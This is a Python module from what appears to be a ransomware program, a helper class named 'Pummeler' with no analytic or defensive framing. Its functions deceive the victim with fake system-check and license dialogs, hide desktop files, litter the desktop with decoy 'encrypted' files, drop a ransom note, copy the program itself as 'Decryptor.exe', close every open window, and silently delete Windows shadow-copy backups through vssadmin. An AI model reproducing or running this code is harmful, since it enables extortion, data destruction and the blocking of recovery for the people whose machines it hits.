import os
import sys
import random
import ctypes
import win32con
import win32api
import platform
import subprocess
import pygetwindow as gw
from typing import List
from stub.utils import get_random_string
from stub.types import (
    ENCRYPTION_CONFIG,
    ALREADY_ENCRYPTED_MAGIC,
    RANSOM_FILE_NAME,
    RANSOM_MESSAGE,
)


class Pummeler:
    """
    Pummeler provides basic functionality for a bunch of other things.
    """

    def __init__(self) -> None:
        home = os.path.expanduser("~")
        self.root_dir = os.path.join(home, "Desktop")

        if not os.path.exists(self.root_dir):
            self.root_dir = os.path.join(home, "OneDrive", "Desktop")

    @staticmethod
    def dialog_box(messages: List[str]) -> None:
        for message in messages:
            ctypes.windll.user32.MessageBoxW(0, message, "Windows", 1)

    @staticmethod
    def fake_dialogs() -> None:
        messages: List[str] = [
            "No corrupted files found.",
            "System32 integrity verified.",
            "Downloaded internal packages.",
            "This program is licensed under the Apache License, Version 2.0. Please press OK to agree to the license.",
        ]
        Pummeler.dialog_box(messages)

    def hide_desktop_files(self) -> None:
        for file in os.listdir(self.root_dir):
            attr = win32api.GetFileAttributes(file)
            win32api.SetFileAttributes(file, attr | win32con.FILE_ATTRIBUTE_HIDDEN)

    def fill_screen(self, amount: int = 40) -> None:
        for _ in range(amount):
            name = f"{get_random_string(8)}{ENCRYPTION_CONFIG.extension}"
            path = os.path.join(self.root_dir, name)
            with open(path, "wb") as f:
                byte_data = [
                    random.randint(0, 2 << 9).to_bytes(2, byteorder="big")
                    for _ in range(1024 + random.randint(0, 1024))
                ]
                f.write(b"".join(byte_data))

    def drop_magic(self, data: bytes = b"") -> None:
        path = os.path.join(self.root_dir, ALREADY_ENCRYPTED_MAGIC)
        if not os.path.exists(path):
            with open(path, "wb") as f:
                f.write(data)

    def drop_encrypted_files(self, files: List[str]) -> None:
        content = "\n".join(files)
        path = os.path.join(self.root_dir, "ENCRYPTED_FILES.txt")

        with open(path, "w") as f:
            f.write(content)

    def drop_decryptor(self) -> None:
        with open(os.path.abspath(sys.argv[0]), "rb") as f:
            content = f.read()

        path = os.path.join(self.root_dir, "Decryptor.exe")
        with open(path, "wb") as f:
            f.write(content)

    def run_decryptor(self) -> None:
        subprocess.Popen([os.path.join(self.root_dir, "Decryptor.exe")])

    def drop_ransom(self, *args) -> None:
        path = os.path.join(self.root_dir, RANSOM_FILE_NAME)
        if not os.path.exists(path):
            with open(path, "w") as f:
                f.write(RANSOM_MESSAGE % args)

    @staticmethod
    def minimize_all_windows() -> None:
        windows = gw.getAllWindows()
        for window in windows:
            if not window.isMinimized:
                window.minimize()

    @staticmethod
    def close_all_windows() -> None:
        windows = gw.getAllWindows()
        current_cmd_window = ctypes.windll.kernel32.GetConsoleWindow()

        for window in windows:
            if window.title and window._hWnd != current_cmd_window:
                window.close()

    def magic_exists(self) -> bool:
        return os.path.exists(os.path.join(self.root_dir, ALREADY_ENCRYPTED_MAGIC))

    @staticmethod
    def delete_shadow_copies() -> None:
        # ! This needs admin privileges
        if platform.architecture()[0] == "64bit":
            vssadmin_path = r"C:\Windows\System32\vssadmin.exe"
        else:
            vssadmin_path = r"C:\Windows\SysWow64\vssadmin.exe"

        subprocess.Popen(
            [vssadmin_path, "delete", "shadows", "/all", "/quiet"], shell=True
        )
